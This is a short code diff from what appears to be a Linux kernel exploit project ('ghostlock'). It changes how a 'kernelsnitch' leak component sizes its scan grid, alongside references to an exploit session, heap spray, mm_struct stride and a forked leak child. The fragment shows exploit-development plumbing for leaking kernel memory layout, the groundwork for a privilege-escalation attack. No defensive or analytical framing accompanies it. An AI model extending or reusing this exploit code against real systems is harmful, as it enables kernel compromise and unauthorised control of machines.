@@ -682,9 +682,12 @@ namespace ghostlock::support {
         }
 
         int32_t cpu_count = static_cast<int32_t>(sysconf(_SC_NPROCESSORS_ONLN));
+        /* The leak scans a stride-agnostic grid (32 primary, 8 last resort;
+         * 4 KiB outer) and does not depend on the profile stride. The profile
+         * value above still sizes the spray. */
         kernelsnitch::KernelSnitchOwner snitch = kernelsnitch::KernelSnitchOwner::create(
-            session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ),
-            kernel::MM_ORDER, static_cast<size_t>(cpu_count), ghostlock::profile::kernelsnitch_collisions(), 0,
+            kernelsnitch::SCAN_PRIMARY_INNER, 0, static_cast<size_t>(cpu_count),
+            ghostlock::profile::kernelsnitch_collisions(), 0,
             static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
         /* The forked leak child borrows the shared mmap context through this
          * compatibility alias; the owner remains the only releaser. */
